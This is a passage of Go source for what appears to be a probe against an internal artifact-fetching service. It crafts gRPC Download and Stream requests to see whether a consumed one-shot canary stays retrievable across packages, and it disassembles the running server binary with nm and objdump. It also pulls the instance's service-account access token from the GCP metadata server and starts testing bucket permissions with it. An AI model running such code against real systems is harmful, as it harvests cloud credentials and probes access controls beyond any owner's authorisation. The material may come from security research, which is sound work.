func callDownload(client *http.Client, endpoint string, request []byte) grpcResult {
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Download", request)
	result.ID = "cross-package-download"
	if !grpcSucceeded(result) {
		return result
	}
	analysis, err := analyzeDownloadBody(body)
	result.Wire = analysis.Wire
	result.RecordMatched = analysis.Identity.Matched
	result.RecordSHA256 = analysis.Identity.RecordSHA256
	result.DigestFieldSHA256 = analysis.Identity.DigestSHA256
	result.IDFieldSHA256 = analysis.Identity.IDSHA256
	result.DownloadStatusSet = analysis.StatusSet
	result.DownloadStatusCode = analysis.StatusCode
	if err != nil {
		result.AnalysisError = cleanError(err)
	}
	return result
}

func callStream(client *http.Client, endpoint string) grpcResult {
	result, body := callGRPCRaw(client, endpoint, "/sos.byteman.Byteman/Stream", buildTargetStreamRequest(bytemanCanaryURL))
	result.ID = "offline-stream-readback"
	if !grpcSucceeded(result) {
		return result
	}
	wire, payload, path, err := analyzeStreamBody(body)
	result.Wire = wire
	if err != nil {
		result.AnalysisError = cleanError(err)
		return result
	}
	digest := sha256.Sum256(payload)
	result.PayloadBytes = len(payload)
	result.PayloadSHA256 = hex.EncodeToString(digest[:])
	result.PayloadPath = path
	return result
}

// callStreamIncremental is deliberately separate from callGRPCRaw. Stream is
// server-streaming and may keep the HTTP/2 stream open after sending the file;
// waiting for EOF can therefore turn valid data into a deadline/CANCEL. This
// reader closes immediately after the exact source-pinned payload is complete.
func callStreamIncremental(client *http.Client, endpoint string) grpcResult {
	const method = "/sos.byteman.Byteman/Stream"
	result := grpcResult{ID: "existing-v44-stream-readback", Method: method}
	payload := buildTargetStreamRequest(bytemanCanaryURL)
	frame := attachRequestTranscript(&result, payload)
	if len(payload) != 282 {
		result.Error = "exact StreamRequest payload length was not 282 bytes"
		return result
	}
	decoded, valid := decodeWireMessage(payload, 0)
	if !valid || len(decoded.fields) != 2 || decoded.fields[0].number != 1 || decoded.fields[0].wire != 2 ||
		string(decoded.fields[0].value) != bytemanCanaryURL || decoded.fields[1].number != 2 ||
		decoded.fields[1].wire != 2 {
		result.Error = "StreamRequest was not exact URL plus metadata"
		return result
	}
	metadata, valid := decodeWireMessage(decoded.fields[1].value, 0)
	if !valid || len(decoded.fields[1].value) != 89 || !targetMetadataMatches(metadata) {
		result.Error = "StreamRequest metadata was not the exact 89-byte owned-B coordinate"
		return result
	}

	ctx, cancel := context.WithTimeout(context.Background(), bytemanHTTPTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set(sosSessionMetadataKey, "")
	request.Header.Set("Grpc-Timeout", "60S")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	contentType := strings.ToLower(strings.TrimSpace(strings.Split(result.ContentType, ";")[0]))
	if response.StatusCode != http.StatusOK ||
		(contentType != "application/grpc" && contentType != "application/grpc+proto") {
		result.Error = "Stream endpoint did not return HTTP 200 application/grpc"
		return result
	}
	result.Authenticated = true
	analysis, err := readExactStreamFrames(response.Body)
	result.BodyBytes = analysis.BodyBytes
	result.BodySHA256 = analysis.BodySHA256
	result.FrameCount = analysis.FrameCount
	result.FrameSHA256 = analysis.FrameSHA256
	result.Wire = analysis.Wire
	result.HeaderCount = analysis.HeaderCount
	result.HeaderSHA256 = analysis.HeaderSHA256
	result.HeaderValid = analysis.Header.Valid
	result.HeaderStatusSet = analysis.Header.StatusSet
	result.HeaderStatusCode = analysis.Header.StatusCode
	result.HeaderContentType = analysis.Header.ContentType
	result.RawHeaderCount = analysis.Header.RawCount
	result.PayloadBytes = len(analysis.Payload)
	result.PayloadSHA256 = analysis.PayloadSHA256
	result.PayloadPath = analysis.PayloadPath
	if err != nil {
		result.AnalysisError = cleanError(err)
		return result
	}
	result.EarlyClose = true
	// grpc-status is intentionally not required: the verified terminal
	// condition is the exact bounded payload, reached before streaming EOF.
	result.GRPCStatus = response.Header.Get("Grpc-Status")
	return result
}

type incrementalStreamAnalysis struct {
	BodyBytes     int
	BodySHA256    string
	FrameCount    int
	FrameSHA256   []string
	Wire          []wireFieldDigest
	HeaderCount   int
	HeaderSHA256  string
	Header        streamHeaderAnalysis
	Payload       []byte
	PayloadSHA256 string
	PayloadPath   string
}

func readExactStreamFrames(reader io.Reader) (incrementalStreamAnalysis, error) {
	analysis := incrementalStreamAnalysis{}
	bodyHasher := sha256.New()
	finishBody := func() {
		analysis.BodySHA256 = hex.EncodeToString(bodyHasher.Sum(nil))
	}
	seenData := false
	for analysis.FrameCount < maximumStreamFrames {
		header := make([]byte, 5)
		if _, err := io.ReadFull(reader, header); err != nil {
			finishBody()
			return analysis, fmt.Errorf("Stream ended before the exact payload: %w", err)
		}
		analysis.BodyBytes += len(header)
		_, _ = bodyHasher.Write(header)
		if header[0] != 0 {
			finishBody()
			return analysis, errors.New("compressed Stream gRPC frame was not allowed")
		}
		length := int(binary.BigEndian.Uint32(header[1:]))
		if length < 0 || length > maximumStreamFrameBytes || analysis.BodyBytes+length > maximumBody {
			finishBody()
			return analysis, errors.New("Stream gRPC frame exceeded the bounded response size")
		}
		messageBytes := make([]byte, length)
		if _, err := io.ReadFull(reader, messageBytes); err != nil {
			finishBody()
			return analysis, fmt.Errorf("truncated Stream gRPC frame: %w", err)
		}
		analysis.BodyBytes += len(messageBytes)
		_, _ = bodyHasher.Write(messageBytes)
		fullFrame := append(append([]byte(nil), header...), messageBytes...)
		frameDigest := sha256.Sum256(fullFrame)
		analysis.FrameSHA256 = append(analysis.FrameSHA256, hex.EncodeToString(frameDigest[:]))
		frameIndex := analysis.FrameCount
		analysis.FrameCount++

		message, valid := decodeWireMessage(messageBytes, 0)
		if !valid {
			finishBody()
			return analysis, errors.New("Stream frame was not valid bounded protobuf wire data")
		}
		if err := walkWireMessage(message, "frame["+strconv.Itoa(frameIndex)+"]", &analysis.Wire); err != nil {
			finishBody()
			return analysis, err
		}
		for _, field := range message.fields {
			switch field.number {
			case 1:
				if field.wire != 2 || analysis.HeaderCount != 0 || seenData {
					finishBody()
					return analysis, errors.New("StreamResponse header was duplicated, reordered, or had the wrong wire type")
				}
				analysis.HeaderCount = 1
				headerDigest := sha256.Sum256(field.value)
				analysis.HeaderSHA256 = hex.EncodeToString(headerDigest[:])
				header, err := analyzeStreamHeader(field.value)
				if err != nil {
					finishBody()
					return analysis, err
				}
				analysis.Header = header
			case 2:
				if field.wire != 2 {
					finishBody()
					return analysis, errors.New("StreamResponse data field 2 had the wrong wire type")
				}
				seenData = true
				if len(analysis.Payload)+len(field.value) > targetCanaryBytes {
					finishBody()
					return analysis, errors.New("StreamResponse data exceeded the exact canary size")
				}
				analysis.Payload = append(analysis.Payload, field.value...)
			default:
				finishBody()
				return analysis, errors.New("StreamResponse contained an unexpected top-level field")
			}
		}
		if len(analysis.Payload) == targetCanaryBytes {
			payloadDigest := sha256.Sum256(analysis.Payload)
			analysis.PayloadSHA256 = hex.EncodeToString(payloadDigest[:])
			analysis.PayloadPath = "top-level-field-2"
			finishBody()
			if analysis.PayloadSHA256 != targetCanarySHA256 {
				return analysis, errors.New("exact-length StreamResponse payload had the wrong SHA-256")
			}
			if analysis.HeaderCount != 1 || !analysis.Header.Valid {
				return analysis, errors.New("exact StreamResponse payload lacked one valid status-200 Header")
			}
			return analysis, nil
		}
	}
	finishBody()
	return analysis, errors.New("Stream response exceeded the bounded frame count")
}

type streamHeaderAnalysis struct {
	Valid       bool
	StatusSet   bool
	StatusCode  uint64
	ContentType string
	RawCount    int
}

func analyzeStreamHeader(value []byte) (streamHeaderAnalysis, error) {
	analysis := streamHeaderAnalysis{}
	header, valid := decodeWireMessage(value, 0)
	if !valid {
		return analysis, errors.New("StreamResponse Header was not valid protobuf wire data")
	}
	counts := map[int]int{}
	for _, field := range header.fields {
		if field.number < 1 || field.number > 9 {
			return analysis, errors.New("StreamResponse Header contained a field outside the pinned 1..9 schema")
		}
		counts[field.number]++
		if field.number != 9 && counts[field.number] > 1 {
			return analysis, errors.New("StreamResponse Header duplicated an optional field")
		}
		switch field.number {
		case 1, 3, 4:
			if field.wire != 2 || len(field.value) > 4096 || !utf8.Valid(field.value) {
				return analysis, errors.New("StreamResponse Header string field was invalid or unbounded")
			}
			if field.number == 1 {
				analysis.ContentType = string(field.value)
			}
		case 2, 5, 6, 7, 8:
			if field.wire != 0 {
				return analysis, errors.New("StreamResponse Header integer field had the wrong wire type")
			}
			if field.number == 2 {
				analysis.StatusSet = true
				analysis.StatusCode = field.varint
			}
		case 9:
			if field.wire != 2 || counts[9] > 64 {
				return analysis, errors.New("StreamResponse Header raw field was invalid or unbounded")
			}
			raw, valid := decodeWireMessage(field.value, 0)
			if !valid {
				return analysis, errors.New("StreamResponse raw Header was not valid protobuf wire data")
			}
			rawCounts := map[int]int{}
			for _, item := range raw.fields {
				rawCounts[item.number]++
				if item.wire != 2 || (item.number != 1 && item.number != 2) || rawCounts[item.number] > 1 {
					return analysis, errors.New("StreamResponse raw Header did not match key/value fields 1 and 2")
				}
				if item.number == 1 && (len(item.value) > 1024 || !utf8.Valid(item.value)) {
					return analysis, errors.New("StreamResponse raw Header key was invalid or unbounded")
				}
				if item.number == 2 && len(item.value) > 16*1024 {
					return analysis, errors.New("StreamResponse raw Header value was unbounded")
				}
			}
			if rawCounts[1] != 1 || rawCounts[2] != 1 {
				return analysis, errors.New("StreamResponse raw Header omitted key or value")
			}
			analysis.RawCount++
		}
	}
	if !analysis.StatusSet || analysis.StatusCode != http.StatusOK {
		return analysis, errors.New("StreamResponse Header did not contain status_code 200")
	}
	analysis.Valid = true
	return analysis, nil
}

func waitOriginOffline() originResult {
	deadline := time.Now().Add(originTransitionWindow)
	last := originResult{}
	for time.Now().Before(deadline) {
		last = verifyOriginOffline()
		if last.Offline {
			return last
		}
		remaining := time.Until(deadline)
		if remaining <= 0 {
			break
		}
		delay := time.Second
		if remaining < delay {
			delay = remaining
		}
		time.Sleep(delay)
	}
	return last
}

func verifyOriginOffline() originResult {
	result := originResult{}
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       requestTimeout,
	}
	headContext, headCancel := context.WithTimeout(context.Background(), requestTimeout)
	defer headCancel()
	head, err := http.NewRequestWithContext(headContext, http.MethodHead, bytemanCanaryURL, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	head.Header.Set("User-Agent", probeUserAgent+"-offline-check")
	headResponse, err := client.Do(head)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	result.HeadHTTPStatus = headResponse.StatusCode
	result.HeadState = headResponse.Header.Get("X-Codex-One-Shot-State")
	headResponse.Body.Close()
	if result.HeadHTTPStatus != http.StatusGone || result.HeadState != "consumed" {
		return result
	}

	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, bytemanCanaryURL, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("User-Agent", probeUserAgent+"-offline-check")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	result.State = response.Header.Get("X-Codex-One-Shot-State")
	body, err := io.ReadAll(io.LimitReader(response.Body, 4097))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	if len(body) > 4096 {
		result.Error = "origin check response too large"
		return result
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.Offline = response.StatusCode == http.StatusGone &&
		result.BodyBytes == originGoneBytes && result.BodySHA256 == originGoneSHA256 &&
		result.ContentType == "application/json" && result.State == "consumed"
	return result
}

func grpcSucceeded(result grpcResult) bool {
	return result.HTTPStatus == http.StatusOK && result.GRPCStatus == "0"
}

func buildURLLookupRequest(canaryURL string) []byte {
	return appendStringField(nil, 2, canaryURL)
}

func buildCoordinateLookupRequest() []byte {
	request := []byte{}
	request = appendStringField(request, 7, targetRegistry)
	request = appendStringField(request, 8, targetModuleName)
	request = appendStringField(request, 9, targetVersion)
	request = appendVarintField(request, 10, lookupRecordLimit)
	return request
}

func buildTargetMetadata() []byte {
	metadata := []byte{}
	metadata = appendStringField(metadata, 2, targetRegistry)
	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
	metadata = appendStringField(metadata, 4, targetModuleName)
	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
	metadata = appendStringField(metadata, 6, targetVersion)
	return metadata
}

func descriptorVerifiedDownloadPolicy() (int, uint64, error) {
	field, fieldErr := strconv.Atoi(descriptorDownloadPolicyField)
	value, valueErr := strconv.ParseUint(descriptorDownloadPolicyValue, 10, 64)
	validName := len(descriptorDownloadPolicyName) >= 1 && len(descriptorDownloadPolicyName) <= 64
	for _, character := range descriptorDownloadPolicyName {
		if (character < 'A' || character > 'Z') && (character < '0' || character > '9') && character != '_' {
			validName = false
		}
	}
	if fieldErr != nil || valueErr != nil || field != 5 || value != 4 ||
		!validName || descriptorDownloadPolicyName != "ALWAYS" {
		return 0, 0, errors.New("descriptor-verified Download policy patch point was unresolved")
	}
	return field, value, nil
}

func descriptorVerifiedRedirectConfig() (int, []byte, error) {
	configField, configErr := strconv.Atoi(descriptorRedirectConfigField)
	policyField, fieldErr := strconv.Atoi(descriptorRedirectPolicyField)
	policyValue, valueErr := strconv.ParseUint(descriptorRedirectPolicyValue, 10, 64)
	if configErr != nil || fieldErr != nil || valueErr != nil || configField != 8 || policyField != 1 ||
		policyValue != 2 || descriptorRedirectPolicyName != "FOLLOW_NONE" {
		return 0, nil, errors.New("descriptor-verified RedirectConfig patch point was unresolved")
	}
	return configField, appendVarintField(nil, policyField, policyValue), nil
}

func buildTargetDownloadRequest(canaryURL string) ([]byte, error) {
	if canaryURL != bytemanCanaryURL {
		return nil, errors.New("Download URL did not equal the runtime-validated owned-B URL")
	}
	policyField, policyValue, err := descriptorVerifiedDownloadPolicy()
	if err != nil {
		return nil, err
	}
	redirectField, redirectConfig, err := descriptorVerifiedRedirectConfig()
	if err != nil {
		return nil, err
	}
	request := []byte{}
	request = appendStringField(request, 1, canaryURL)
	request = appendBytesField(request, 4, buildTargetMetadata())
	request = appendStringField(request, 6, downloadSource)
	request = appendVarintField(request, policyField, policyValue)
	request = appendBytesField(request, redirectField, redirectConfig)
	return request, nil
}

func buildTargetStreamRequest(canaryURL string) []byte {
	request := appendStringField(nil, 1, canaryURL)
	request = appendBytesField(request, 2, buildTargetMetadata())
	return request
}

type decodedWireMessage struct {
	fields []decodedWireField
}

type decodedWireField struct {
	number int
	wire   int
	varint uint64
	value  []byte
	child  *decodedWireMessage
}

func decodeWireMessage(data []byte, depth int) (*decodedWireMessage, bool) {
	if depth > maximumWireDepth {
		return nil, false
	}
	message := &decodedWireMessage{}
	for offset := 0; offset < len(data); {
		key, size := binary.Uvarint(data[offset:])
		if size <= 0 {
			return nil, false
		}
		offset += size
		number := int(key >> 3)
		wire := int(key & 7)
		if number < 1 || number > (1<<29)-1 {
			return nil, false
		}
		field := decodedWireField{number: number, wire: wire}
		switch wire {
		case 0:
			field.varint, size = binary.Uvarint(data[offset:])
			if size <= 0 {
				return nil, false
			}
			offset += size
		case 1:
			if len(data)-offset < 8 {
				return nil, false
			}
			offset += 8
		case 2:
			length, lengthSize := binary.Uvarint(data[offset:])
			if lengthSize <= 0 {
				return nil, false
			}
			offset += lengthSize
			if length > uint64(len(data)-offset) {
				return nil, false
			}
			field.value = data[offset : offset+int(length)]
			offset += int(length)
			if len(field.value) > 0 && depth < maximumWireDepth {
				if child, valid := decodeWireMessage(field.value, depth+1); valid && len(child.fields) > 0 {
					field.child = child
				}
			}
		case 5:
			if len(data)-offset < 4 {
				return nil, false
			}
			offset += 4
		default:
			return nil, false
		}
		message.fields = append(message.fields, field)
	}
	return message, true
}

func decodeGRPCMessages(body []byte) ([]*decodedWireMessage, error) {
	var messages []*decodedWireMessage
	for offset := 0; offset < len(body); {
		if len(body)-offset < 5 {
			return nil, errors.New("truncated gRPC frame header")
		}
		if body[offset] != 0 {
			return nil, errors.New("compressed gRPC response was not allowed")
		}
		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
		offset += 5
		if length < 0 || length > len(body)-offset {
			return nil, errors.New("truncated gRPC frame payload")
		}
		message, valid := decodeWireMessage(body[offset:offset+length], 0)
		if !valid {
			return nil, errors.New("gRPC payload was not valid bounded protobuf wire data")
		}
		messages = append(messages, message)
		offset += length
	}
	return messages, nil
}

func knownWireText(value []byte) string {
	if !utf8.Valid(value) {
		return ""
	}
	switch string(value) {
	case bytemanCanaryURL:
		return "[canary-url]"
	case targetRegistry, targetModuleName, targetVersion, downloadSource:
		return string(value)
	default:
		return ""
	}
}

func summarizeWireMessages(messages []*decodedWireMessage) ([]wireFieldDigest, error) {
	var digests []wireFieldDigest
	for frame, message := range messages {
		prefix := "frame[" + strconv.Itoa(frame) + "]"
		if err := walkWireMessage(message, prefix, &digests); err != nil {
			return nil, err
		}
	}
	return digests, nil
}

func summarizeWirePayload(payload []byte) ([]wireFieldDigest, error) {
	message, valid := decodeWireMessage(payload, 0)
	if !valid {
		return nil, errors.New("request payload was not valid bounded protobuf wire data")
	}
	var digests []wireFieldDigest
	if err := walkWireMessage(message, "request", &digests); err != nil {
		return nil, err
	}
	return digests, nil
}

func walkWireMessage(message *decodedWireMessage, prefix string, digests *[]wireFieldDigest) error {
	occurrences := map[int]int{}
	for _, field := range message.fields {
		index := occurrences[field.number]
		occurrences[field.number]++
		if len(*digests) >= maximumWireFields {
			return errors.New("protobuf wire field limit exceeded")
		}
		component := strconv.Itoa(field.number)
		path := prefix + "." + component + "[" + strconv.Itoa(index) + "]"
		item := wireFieldDigest{Path: path, WireType: field.wire}
		if field.wire == 0 {
			value := field.varint
			item.Varint = &value
		}
		if field.wire == 2 {
			digest := sha256.Sum256(field.value)
			item.Bytes = len(field.value)
			item.SHA256 = hex.EncodeToString(digest[:])
			item.Text = knownWireText(field.value)
			item.Nested = field.child != nil
		}
		*digests = append(*digests, item)
		if field.child != nil {
			if err := walkWireMessage(field.child, path, digests); err != nil {
				return err
			}
		}
	}
	return nil
}

type lookupBodyAnalysis struct {
	Wire          []wireFieldDigest
	RecordCount   int
	MatchCount    int
	RecordsSHA256 string
	MatchSHA256   string
	MatchPath     string
	RecordSHA256  string
	DigestSHA256  string
	IDSHA256      string
}

type downloadRecordIdentity struct {
	Matched      bool
	RecordSHA256 string
	DigestSHA256 string
	IDSHA256     string
}

type downloadBodyAnalysis struct {
	Wire       []wireFieldDigest
	Identity   downloadRecordIdentity
	StatusSet  bool
	StatusCode uint64
}

func targetMetadataMatches(message *decodedWireMessage) bool {
	counts := map[int]int{}
	matched := map[int]bool{}
	for _, field := range message.fields {
		switch field.number {
		case 2:
			counts[2]++
			matched[2] = field.wire == 2 && string(field.value) == targetRegistry
		case 3:
			counts[3]++
			matched[3] = field.wire == 0 && field.varint == 1 // GO_MODULE
		case 4:
			counts[4]++
			matched[4] = field.wire == 2 && string(field.value) == targetModuleName
		case 5:
			counts[5]++
			matched[5] = field.wire == 0 && field.varint == 1 // CONCRETE
		case 6:
			counts[6]++
			matched[6] = field.wire == 2 && string(field.value) == targetVersion
		}
	}
	for _, number := range []int{2, 3, 4, 5, 6} {
		if counts[number] != 1 || !matched[number] {
			return false
		}
	}
	return true
}

func analyzeTargetDownload(value []byte) downloadRecordIdentity {
	identity := downloadRecordIdentity{}
	message, valid := decodeWireMessage(value, 0)
	if !valid {
		return identity
	}
	counts := map[int]int{}
	matched := map[int]bool{}
	var digestValue, idValue []byte
	for _, field := range message.fields {
		switch field.number {
		case 1:
			counts[1]++
			matched[1] = field.wire == 2 && string(field.value) == bytemanCanaryURL
		case 2:
			counts[2]++
			matched[2] = field.wire == 2 && len(field.value) > 0
			digestValue = field.value
		case 3:
			counts[3]++
			matched[3] = field.wire == 0 && field.varint == targetCanaryBytes
		case 12:
			counts[12]++
			if field.wire == 2 {
				metadata, valid := decodeWireMessage(field.value, 0)
				matched[12] = valid && targetMetadataMatches(metadata)
			}
		case 17:
			counts[17]++
			matched[17] = field.wire == 2 && len(field.value) > 0
			idValue = field.value
		}
	}
	for _, number := range []int{1, 2, 3, 12, 17} {
		if counts[number] != 1 || !matched[number] {
			return identity
		}
	}
	recordDigest := sha256.Sum256(value)
	digestDigest := sha256.Sum256(digestValue)
	idDigest := sha256.Sum256(idValue)
	identity.Matched = true
	identity.RecordSHA256 = hex.EncodeToString(recordDigest[:])
	identity.DigestSHA256 = hex.EncodeToString(digestDigest[:])
	identity.IDSHA256 = hex.EncodeToString(idDigest[:])
	return identity
}

func analyzeDownloadBody(body []byte) (downloadBodyAnalysis, error) {
	analysis := downloadBodyAnalysis{}
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return analysis, err
	}
	if len(messages) != 1 {
		return analysis, errors.New("Download response did not contain exactly one unary gRPC frame")
	}
	analysis.Wire, err = summarizeWireMessages(messages)
	if err != nil {
		return analysis, err
	}
	recordCount := 0
	statusCount := 0
	for _, field := range messages[0].fields {
		switch field.number {
		case 1:
			recordCount++
			if field.wire != 2 {
				return analysis, errors.New("DownloadResponse record field had the wrong wire type")
			}
			analysis.Identity = analyzeTargetDownload(field.value)
		case 3:
			statusCount++
			if field.wire != 0 {
				return analysis, errors.New("DownloadResponse status_code had the wrong wire type")
			}
			analysis.StatusSet = true
			analysis.StatusCode = field.varint
		default:
			return analysis, errors.New("DownloadResponse contained a field outside record 1 and status_code 3")
		}
	}
	if recordCount != 1 || statusCount > 1 || !analysis.Identity.Matched {
		return analysis, errors.New("DownloadResponse omitted one exact identified B record")
	}
	return analysis, nil
}

func writeFingerprintRecord(hasher io.Writer, value []byte) {
	var length [4]byte
	binary.BigEndian.PutUint32(length[:], uint32(len(value)))
	_, _ = hasher.Write(length[:])
	_, _ = hasher.Write(value)
}

func analyzeLookupBody(body []byte) (lookupBodyAnalysis, error) {
	analysis := lookupBodyAnalysis{}
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return analysis, err
	}
	if len(messages) == 0 {
		return analysis, errors.New("streaming Lookup response contained no gRPC frames")
	}
	analysis.Wire, err = summarizeWireMessages(messages)
	if err != nil {
		return analysis, err
	}
	recordsHasher := sha256.New()
	matchesHasher := sha256.New()
	for frameIndex, message := range messages {
		fieldIndex := 0
		for _, field := range message.fields {
			if field.number != 1 {
				return analysis, errors.New("LookupResponse contained a field outside repeated Download field 1")
			}
			if field.wire != 2 {
				return analysis, errors.New("LookupResponse Download field had the wrong wire type")
			}
			analysis.RecordCount++
			writeFingerprintRecord(recordsHasher, field.value)
			identity := analyzeTargetDownload(field.value)
			if identity.Matched {
				analysis.MatchCount++
				writeFingerprintRecord(matchesHasher, field.value)
				analysis.MatchPath = "frame[" + strconv.Itoa(frameIndex) + "].1[" + strconv.Itoa(fieldIndex) + "]"
				analysis.RecordSHA256 = identity.RecordSHA256
				analysis.DigestSHA256 = identity.DigestSHA256
				analysis.IDSHA256 = identity.IDSHA256
			}
			fieldIndex++
		}
	}
	if analysis.RecordCount > 0 {
		analysis.RecordsSHA256 = hex.EncodeToString(recordsHasher.Sum(nil))
	}
	if analysis.MatchCount > 0 {
		analysis.MatchSHA256 = hex.EncodeToString(matchesHasher.Sum(nil))
	}
	if analysis.MatchCount != 1 {
		analysis.MatchPath = ""
		analysis.RecordSHA256 = ""
		analysis.DigestSHA256 = ""
		analysis.IDSHA256 = ""
	}
	return analysis, nil
}

func exactPayload(value []byte, expectedBytes int, expectedSHA256 string) bool {
	if len(value) != expectedBytes {
		return false
	}
	digest := sha256.Sum256(value)
	return hex.EncodeToString(digest[:]) == expectedSHA256
}

func analyzeStreamBody(body []byte) ([]wireFieldDigest, []byte, string, error) {
	return analyzeStreamBodyExpected(body, targetCanaryBytes, targetCanarySHA256)
}

func analyzeStreamBodyExpected(body []byte, expectedBytes int, expectedSHA256 string) ([]wireFieldDigest, []byte, string, error) {
	messages, err := decodeGRPCMessages(body)
	if err != nil {
		return nil, nil, "", err
	}
	if len(messages) == 0 {
		return nil, nil, "", errors.New("Stream response contained no gRPC frames")
	}
	digests, err := summarizeWireMessages(messages)
	if err != nil {
		return nil, nil, "", err
	}
	payload := []byte{}
	for _, message := range messages {
		for _, field := range message.fields {
			if field.number != 2 {
				continue
			}
			if field.wire != 2 {
				return digests, nil, "", errors.New("StreamResponse data field 2 had the wrong wire type")
			}
			payload = append(payload, field.value...)
			if len(payload) > expectedBytes {
				return digests, nil, "", errors.New("StreamResponse data exceeded the exact canary size")
			}
		}
	}
	if !exactPayload(payload, expectedBytes, expectedSHA256) {
		return digests, nil, "", errors.New("top-level StreamResponse field 2 did not match the exact canary")
	}
	return digests, payload, "top-level-field-2", nil
}

type boundedBuffer struct {
	data      []byte
	maximum   int
	truncated bool
}

func (buffer *boundedBuffer) Write(value []byte) (int, error) {
	written := len(value)
	remaining := buffer.maximum - len(buffer.data)
	if remaining > 0 {
		if remaining > len(value) {
			remaining = len(value)
		}
		buffer.data = append(buffer.data, value[:remaining]...)
	}
	if remaining < len(value) {
		buffer.truncated = true
	}
	return written, nil
}

func runFixedTool(path string, arguments ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
	defer cancel()
	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
	stderr := &boundedBuffer{maximum: 16 * 1024}
	command := exec.CommandContext(ctx, path, arguments...)
	command.Stdout = stdout
	command.Stderr = stderr
	err := command.Run()
	if ctx.Err() != nil {
		return nil, errors.New("fixed inspection tool timed out")
	}
	if err != nil {
		return nil, errors.New("fixed inspection tool failed")
	}
	if stdout.truncated {
		return nil, errors.New("fixed inspection output exceeded its limit")
	}
	return stdout.data, nil
}

func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
	var result []string
	scanner := bufio.NewScanner(bytes.NewReader(data))
	scanner.Buffer(make([]byte, 4096), 64*1024)
	for scanner.Scan() && len(result) < maximum {
		line := strings.TrimSpace(scanner.Text())
		if len(line) > 512 {
			line = line[:512] + "[truncated]"
		}
		if line != "" && include(line) {
			result = append(result, line)
		}
	}
	return result
}

func instructionWindow(data []byte, marker string, before, after int) []string {
	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
	for index, line := range lines {
		if !strings.Contains(line, marker) {
			continue
		}
		start := index - before
		if start < 0 {
			start = 0
		}
		end := index + after + 1
		if end > len(lines) {
			end = len(lines)
		}
		return append([]string(nil), lines[start:end]...)
	}
	return nil
}

func runSessionDataflowInspection(report *probeReport) {
	result := &inspectionResult{}
	report.Inspection = result
	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
	}, 64)
	dialOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel",
		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 28, 16)
	callerOutput, err := runFixedTool(
		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
	)
	if err != nil {
		result.Error = cleanError(err)
		return
	}
	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
		result.Error = "fixed inspection markers were incomplete"
		return
	}
	report.Reason = "bounded static session dataflow inspection completed"
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
